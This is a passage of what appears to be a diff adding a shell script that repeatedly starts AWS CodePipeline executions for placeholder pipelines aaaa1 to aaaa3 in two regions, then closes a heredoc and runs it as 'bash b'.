+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region eu-north-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region eu-north-1
+
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa1 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa2 --output text --region sa-east-1
+aws codepipeline start-pipeline-execution --name aaaa3 --output text --region sa-east-1
+687185077845
+done
+EOF
+
+bash b
